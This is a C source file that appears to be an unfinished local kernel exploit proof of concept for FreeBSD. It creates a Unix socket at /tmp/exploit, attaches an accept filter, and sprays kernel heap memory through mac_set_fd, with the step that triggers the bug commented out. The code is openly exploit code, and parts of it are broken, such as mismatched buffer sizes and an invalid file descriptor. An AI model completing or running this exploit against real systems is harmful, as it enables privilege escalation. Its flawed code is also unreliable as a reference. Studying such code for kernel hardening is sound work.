#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mac.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <netinet/in.h>
#include <netinet/ip6.h>

#define TARGET_SOCK_PATH "/tmp/exploit"
#define N_SPRAY_SOCKETS 8

int new_target_socket() {
    return socket(AF_UNIX, SOCK_STREAM, 0);
}

// TODO dynamic buf_len
size_t prepare_mac_spray_buf(uint8_t **buf, size_t buf_len) {
    *buf = calloc(8, sizeof(uint8_t));
    strncpy((char *)*buf, "AAAAAAA", 16);
    return 8;
}

int mac_set_fd_spray(uint8_t *buf, size_t buf_len) {
    mac_t mac;

    mac = calloc(1, sizeof(struct mac));
    mac->m_buflen = buf_len;
    mac->m_string = (char *)buf;
    mac_set_fd(-1, mac);
    return 0;
}

int set_filter_on_socket(int socket) {
    struct accept_filter_arg arg;
    
    strncpy(arg.af_name, "exploit", 16);
    return setsockopt(socket, SOL_SOCKET, SO_ACCEPTFILTER, &arg, sizeof(struct accept_filter_arg));
}

int delete_filter_on_socket(int socket) {
    return setsockopt(socket, SOL_SOCKET, SO_ACCEPTFILTER, NULL, 0);
}

int make_socket_listening(int socket) {
    struct sockaddr_un sockaddr;

    sockaddr.sun_family = AF_UNIX;   
    strcpy(sockaddr.sun_path, TARGET_SOCK_PATH);

    unlink(TARGET_SOCK_PATH);
    if ((bind(socket, (struct sockaddr *)&sockaddr, sizeof(sockaddr))) == -1)
    {
        printf("[!] Bind failed\n");
        return -1;
    }

    if ((listen(socket, 1)) == -1)
    {
        printf("[!] Listen failed\n");
        return -1;
    }
    return 0;
}

int main() {
    int target_socket;
    uint8_t *spray_buf;
    size_t spray_buf_len;

    if ((target_socket = new_target_socket()) == -1) {
        printf("[!] Could not create target socket\n");
        perror("Reason");
        return 1;
    }
    printf("[+] target_socket: %d\n", target_socket);

    if ((make_socket_listening(target_socket)) == -1) {
        printf("[!] Could not listen on target_socket\n");
        perror("Reason");
        return 1;        
    }

    if ((set_filter_on_socket(target_socket)) == -1) {
        printf("[!] Could not set accept filter on target_socket\n");
        perror("Reason");
        return 1;
    }

    if ((spray_buf_len = prepare_mac_spray_buf(&spray_buf, 16)) == 0) {
        goto fail;
    }
    printf("[+] spray_buf_len: %zu\n", spray_buf_len);

    if (mac_set_fd_spray(spray_buf, spray_buf_len) == -1) {
        goto fail;
    }

/*     if ((delete_filter_on_socket(target_socket)) == -1) {
        printf("[!] Could not trigger accept filter bug on target_socket\n");
        perror("Reason");
        return 1;
    }     */

fail:
    return 1;
}